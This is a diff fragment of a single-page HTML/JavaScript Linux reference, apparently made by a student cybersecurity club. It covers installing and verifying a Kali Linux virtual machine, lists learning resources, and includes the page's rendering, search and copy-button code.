+      ["Recommended specs","RAM: 8GB+ (4GB minimum)\nCPU: 2-4 cores, virtualization enabled\nDisk: 40GB+ free (SSD preferred)\nHost: Windows, macOS or Linux"],
+    ]},
+    { t:'stepsHtml', items:[
+      "Enable virtualization in your BIOS/UEFI — look for <b>Intel VT-x</b> or <b>AMD-V</b> and switch it on. Most laptops ship with this off by default.",
+      "Install a free hypervisor: <a href=\"https://www.virtualbox.org/wiki/Downloads\" target=\"_blank\" rel=\"noopener\">VirtualBox</a> (cross-platform, simplest) or <a href=\"https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html\" target=\"_blank\" rel=\"noopener\">VMware Workstation Pro</a> (free for personal use) — <a href=\"https://www.vmware.com/products/desktop-hypervisor/fusion-evaluation\" target=\"_blank\" rel=\"noopener\">VMware Fusion</a> is the Mac equivalent.",
+      "Grab the official pre-built Kali VM image from <a href=\"https://www.kali.org/get-kali/#kali-virtual-machines\" target=\"_blank\" rel=\"noopener\">kali.org/get-kali → Virtual Machines</a> — pick the .ova (VirtualBox) or .vmx (VMware) build so the tools come preinstalled.",
+      "Verify the download before you import it: compare the file's SHA256 sum against the value published on that same Kali download page. On Linux/macOS run <code>sha256sum kali-linux-*.7z</code>; on Windows run <code>Get-FileHash kali-linux-*.7z -Algorithm SHA256</code> in PowerShell. If the hashes don't match, re-download — never import a file that fails this check.",
+      "Import the image into your hypervisor (VirtualBox: <i>File → Import Appliance</i>), bump RAM/CPU to the specs above, then take a clean snapshot before installing or changing anything.",
+      "Boot the VM. Recent Kali images log in with <code>kali / kali</code> — change that password immediately with <code>passwd</code>.",
+      "Update the system and pull the core toolset used in this guide (command below).",
+    ]},
+    { t:'cards', cards:[
+      ["Post-install: update & install tools","sudo apt update && sudo apt full-upgrade -y\nsudo apt install -y nmap wireshark gobuster sqlmap john hydra\nsudo reboot"],
+    ]},
+    { t:'links', items:[
+      ["https://www.kali.org/get-kali/#kali-installer-images","Bare-metal / dual-boot installer","Full ISO installer for putting Kali directly on hardware instead of a VM."],
+      ["https://www.kali.org/docs/usb/","Live USB (persistence optional)","Boot Kali from a USB stick with Rufus (Windows) or balenaEtcher/dd (macOS/Linux); add a persistence partition to save changes."],
+      ["https://www.kali.org/docs/wsl/","Kali on WSL (Windows)","Run Kali as a Windows Subsystem for Linux distro — no VM overhead, good for command-line tools."],
+      ["https://www.kali.org/docs/arm/kali-linux-on-apple-silicon-with-utm/","Apple Silicon via UTM","Native ARM instructions for M1/M2/M3 Macs using the free UTM hypervisor."],
+      ["https://www.kali.org/docs/arm/raspberry-pi-3-installation/","Raspberry Pi","Official ARM image for running Kali on a Raspberry Pi."],
+      ["https://www.kali.org/docs/introduction/download-official-kali-linux-images/","Verifying Kali image signatures","Kali's own walkthrough for checksum + GPG signature verification in detail."],
+    ]},
+    { t:'note', text:"Always download installers and Kali images from the official sites (kali.org, virtualbox.org, vmware.com) — never a third-party mirror or torrent. Verify checksums every time." },
+  ]},
+  { id:"resources", title:"Resources — Beginner to Advanced", blocks:[
+    { t:'links', items:[
+      ["https://linuxjourney.com","Linux Journey","Free, interactive beginner path through the shell, filesystem and permissions."],
+      ["https://www.gnu.org/software/bash/manual/bash.html","GNU Bash Manual","The authoritative reference for scripting syntax."],
+      ["https://explainshell.com","explainshell.com","Paste any command and see every flag explained."],
+      ["https://overthewire.org/wargames/bandit/","OverTheWire: Bandit","Beginner wargame that teaches Linux through SSH challenges."],
+      ["https://tldr.sh","tldr pages","Community-maintained, example-first man pages."],
+      ["https://www.kali.org/docs/","Kali Linux Docs","Official docs for the pentesting distro used in this guide."],
+      ["https://gtfobins.github.io","GTFOBins","Catalog of Unix binaries usable for privilege escalation — advanced, defensive learning."],
+      ["https://tryhackme.com","TryHackMe","Guided rooms covering Linux fundamentals through advanced exploitation."],
+      ["https://cisofy.com/lynis/","Lynis by CISOfy","Open-source security auditing tool for system hardening."],
+      ["https://www.cisecurity.org/cis-benchmarks","CIS Benchmarks","Industry-standard hardening baselines for every major distro."],
+      ["https://wiki.archlinux.org/","Arch Wiki","The best general-purpose Linux administration reference, distro-agnostic in practice."],
+      ["https://www.sans.org/posters/","SANS Cheat Sheets","Free PDF references for forensics, incident response, and command-line security."],
+    ]},
+  ]},
+]},
+];
+
+/* =========================================================
+   RENDER
+   ========================================================= */
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function escA(s){ return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;'); }
+function lvlName(l){ return l==='beg'?'Beginner':l==='int'?'Intermediate':'Advanced'; }
+
+function renderBlock(b){
+  if(b.t==='table'){
+    return '<div class="blk"><table class="table-plain">'+
+      (b.cols?('<tr><th>'+esc(b.cols[0])+'</th><th>'+esc(b.cols[1])+'</th></tr>'):'')+
+      b.rows.map(function(r){
+        var s=(r[0]+' '+r[1]).toLowerCase();
+        return '<tr class="leaf" data-s="'+escA(s)+'"><td class="k">'+esc(r[0])+'</td><td>'+esc(r[1])+'</td></tr>';
+      }).join('')+'</table></div>';
+  }
+  if(b.t==='simple'){
+    return '<div class="blk"><table class="cmdtable">'+b.rows.map(function(r){
+      var cmd=r[0], desc=r[1], ex=r[2];
+      var s=(cmd+' '+desc+' '+(ex||'')).toLowerCase();
+      return '<tr class="leaf" data-s="'+escA(s)+'">'+
+        '<td class="cmd" onclick="copyRow(this)" data-cp="'+escA(cmd)+'"><code>'+esc(cmd)+'</code><span class="cp">copy</span></td>'+
+        '<td class="desc">'+esc(desc)+(ex?('<div class="ex">$ '+esc(ex)+'</div>'):'')+'</td>'+
+      '</tr>';
+    }).join('')+'</table></div>';
+  }
+  if(b.t==='ex'){
+    return '<div class="blk">'+b.items.map(function(it){
+      var name=it[0], desc=it[1], examples=it[2];
+      var s=(name+' '+desc+' '+examples.map(function(e){return e[0]+' '+e[1];}).join(' ')).toLowerCase();
+      return '<div class="exrow leaf" data-s="'+escA(s)+'">'+
+        '<div class="exhead"><code class="exname" onclick="copyRow(this)" data-cp="'+escA(name)+'">'+esc(name)+'<span class="cp">copy</span></code><span class="exdesc">'+esc(desc)+'</span></div>'+
+        '<div class="exlist">'+examples.map(function(e){
+          return '<div class="exitem"><code onclick="copyRow(this)" data-cp="'+escA(e[0])+'">'+esc(e[0])+'<span class="cp">copy</span></code><span>'+esc(e[1])+'</span></div>';
+        }).join('')+'</div>'+
+      '</div>';
+    }).join('')+'</div>';
+  }
+  if(b.t==='cards'){
+    return '<div class="blk cardgrid">'+b.cards.map(function(c){
+      var title=c[0], code=c[1];
+      var s=(title+' '+code).toLowerCase();
+      return '<div class="card leaf" data-s="'+escA(s)+'"><div class="cardhead"><h4>'+esc(title)+'</h4>'+
+        '<button class="cpbtn" onclick="copyBlock(event,this)" data-cp="'+escA(code)+'">copy</button></div>'+
+        '<pre>'+esc(code)+'</pre></div>';
+    }).join('')+'</div>';
+  }
+  if(b.t==='list'){
+    var s=(b.title+' '+b.items.join(' ')).toLowerCase();
+    return '<div class="blk card leaf" data-s="'+escA(s)+'"><div class="cardhead"><h4>'+esc(b.title)+'</h4></div>'+
+      '<ul class="plainlist">'+b.items.map(function(i){return '<li>'+esc(i)+'</li>';}).join('')+'</ul></div>';
+  }
+  if(b.t==='steps'){
+    var s2=b.items.join(' ').toLowerCase();
+    return '<ol class="steps leaf blk" data-s="'+escA(s2)+'">'+b.items.map(function(i){return '<li>'+esc(i)+'</li>';}).join('')+'</ol>';
+  }
+  if(b.t==='stepsHtml'){
+    var s3=b.items.map(function(i){ return i.replace(/<[^>]*>/g,''); }).join(' ').toLowerCase();
+    return '<ol class="steps leaf blk" data-s="'+escA(s3)+'">'+b.items.map(function(i){return '<li>'+i+'</li>';}).join('')+'</ol>';
+  }
+  if(b.t==='note'){
+    return '<div class="note leaf blk" data-s="'+escA(b.text.toLowerCase())+'">'+esc(b.text)+'</div>';
+  }
+  if(b.t==='links'){
+    return '<div class="blk linkgrid">'+b.items.map(function(it){
+      var url=it[0], title=it[1], desc=it[2];
+      var s=(title+' '+desc).toLowerCase();
+      return '<a class="linkcard leaf" data-s="'+escA(s)+'" href="'+escA(url)+'" target="_blank" rel="noopener"><h4>'+esc(title)+'</h4><p>'+esc(desc)+'</p></a>';
+    }).join('')+'</div>';
+  }
+  return '';
+}
+
+function renderGroup(g){
+  return '<div class="group" id="'+g.id+'">'+
+    '<div class="grouphead"><h3>'+esc(g.title)+'</h3>'+(g.level?('<span class="lvl '+g.level+'">'+lvlName(g.level)+'</span>'):'')+'</div>'+
+    g.blocks.map(renderBlock).join('')+
+  '</div>';
+}
+
+var main = document.getElementById('main');
+var sidebar = document.getElementById('sidebar');
+var totalGroups = 0;
+
+SECTIONS.forEach(function(sec, si){
+  var secId = 'sec-'+si;
+  var label = document.createElement('div');
+  label.className = 'topsec-label';
+  label.innerHTML = '<span class="n">'+String(si+1).padStart(2,'0')+'</span> '+esc(sec.title);
+  sidebar.appendChild(label);
+
+  sec.groups.forEach(function(g){
+    totalGroups++;
+    var a = document.createElement('a');
+    a.href = '#'+g.id;
+    a.textContent = g.title;
+    sidebar.appendChild(a);
+  });
+
+  var secEl = document.createElement('section');
+  secEl.className = 'topsec';
+  secEl.id = secId;
+  secEl.innerHTML = '<div class="sechead"><h2>'+esc(sec.title)+'</h2><p>'+esc(sec.desc)+'</p></div>'+
+    sec.groups.map(renderGroup).join('');
+  main.appendChild(secEl);
+});
+
+/* stats */
+var totalLeaf = document.querySelectorAll('.leaf').length;
+document.getElementById('statCmds').textContent = totalLeaf;
+document.getElementById('statGroups').textContent = totalGroups;
+document.getElementById('statSections').textContent = SECTIONS.length;
+document.getElementById('count').textContent = totalLeaf + ' entries across ' + totalGroups + ' topic groups';
+
+/* copy handlers */
+function flashCopied(span){
+  if(!span) return;
+  var orig = span.textContent;
+  span.textContent = 'copied';
+  setTimeout(function(){ span.textContent = orig; }, 900);
+}
+function copyRow(el){
+  var text = el.getAttribute('data-cp');
+  if(navigator.clipboard) navigator.clipboard.writeText(text).catch(function(){});
+  flashCopied(el.querySelector('.cp'));
+}
+function copyBlock(evt, btn){
+  evt.stopPropagation();
+  var text = btn.getAttribute('data-cp');
+  if(navigator.clipboard) navigator.clipboard.writeText(text).catch(function(){});
+  var orig = btn.textContent;
+  btn.textContent = 'copied';
+  setTimeout(function(){ btn.textContent = orig; }, 900);
+}
+
+/* search / filter */
+var countEl = document.getElementById('count');
+var emptyEl = document.getElementById('emptyState');
+function filterAll(q){
+  q = q.trim().toLowerCase();
+  var shown = 0;
+  document.querySelectorAll('.leaf').forEach(function(el){
+    var match = !q || (el.getAttribute('data-s')||'').indexOf(q) !== -1;
+    el.style.display = match ? '' : 'none';
+    if(match) shown++;
+  });
+  document.querySelectorAll('.group').forEach(function(g){
+    var any = Array.prototype.some.call(g.querySelectorAll('.leaf'), function(l){ return l.style.display !== 'none'; });
+    g.style.display = any ? '' : 'none';
+  });
+  document.querySelectorAll('.topsec').forEach(function(s){
+    var any = Array.prototype.some.call(s.querySelectorAll('.group'), function(g){ return g.style.display !== 'none'; });
+    s.style.display = any ? '' : 'none';
+  });
+  countEl.textContent = q ? (shown + ' entries match "' + q + '"') : (totalLeaf + ' entries across ' + totalGroups + ' topic groups');
+  emptyEl.style.display = (q && shown === 0) ? 'block' : 'none';
+}
+
+/* active nav highlight on scroll */
+var navLinks = Array.prototype.slice.call(document.querySelectorAll('#sidebar a'));
+var groupEls = Array.prototype.slice.call(document.querySelectorAll('.group'));
+window.addEventListener('scroll', function(){
+  var idx = 0;
+  groupEls.forEach(function(el, i){ if(el.getBoundingClientRect().top - 90 <= 0) idx = i; });
+  navLinks.forEach(function(a){ a.classList.remove('active'); });
+  if(navLinks[idx]){
+    navLinks[idx].classList.add('active');
+    navLinks[idx].scrollIntoView({block:'nearest'});
+  }
+  var toTop = document.getElementById('toTop');
+  toTop.classList.toggle('show', window.scrollY > 700);
+}, {passive:true});
+
+document.getElementById('toTop').addEventListener('click', function(){
+  window.scrollTo({top:0, behavior:'smooth'});
+});
+
+/* mobile sidebar toggle */
+var menuToggle = document.getElementById('menuToggle');
+menuToggle.addEventListener('click', function(){
+  sidebar.classList.toggle('open');
+});
+sidebar.addEventListener('click', function(e){
+  if(e.target.tagName === 'A' && window.innerWidth <= 900) sidebar.classList.remove('open');
+});
+
+/* hero terminal boot animation — one orchestrated sequence, runs once */
+(function(){
+  var box = document.getElementById('termBox');
+  var lines = [
+    {text:'root@ewucsc:~$ whoami', cls:''},
+    {text:'club-member', cls:'out'},
+    {text:'root@ewucsc:~$ cat sources.txt', cls:''},
+    {text:'linux.html + linux_.html + linux(1).html + linux_advanced.html', cls:'out'},
+    {text:'root@ewucsc:~$ ./merge.sh --no-delete --sort --style', cls:''},
+    {text:'[ok] ' + (totalLeaf || '700') + ' entries merged, 0 dropped.', cls:'out'},
+  ];
+  var i = 0;
+  function next(){
+    if(i >= lines.length){
+      var c = document.createElement('span');
+      c.className = 'caret';
+      box.appendChild(c);
+      return;
+    }
+    var div = document.createElement('div');
+    div.className = 'ln' + (lines[i].cls ? ' ' + lines[i].cls : '');
+    div.textContent = lines[i].text;
+    box.appendChild(div);
+    requestAnimationFrame(function(){ div.classList.add('show'); });
+    i++;
+    setTimeout(next, lines[i-1] && lines[i-1].cls === 'out' ? 260 : 420);
+  }
+  setTimeout(next, 200);
+})();
+
+/* animated stat counters, once on load */
+(function(){
+  function animate(el, target){
+    var start = 0, dur = 900, t0 = null;
+    function step(ts){
+      if(!t0) t0 = ts;
+      var p = Math.min(1, (ts - t0) / dur);
+      el.textContent = Math.floor(p * target);
+      if(p < 1) requestAnimationFrame(step); else el.textContent = target;
+    }
+    requestAnimationFrame(step);
+  }
+  animate(document.getElementById('statCmds'), totalLeaf);
+  animate(document.getElementById('statGroups'), totalGroups);
+  animate(document.getElementById('statSections'), SECTIONS.length);
+})();
+</script>
+</body>
+</html>
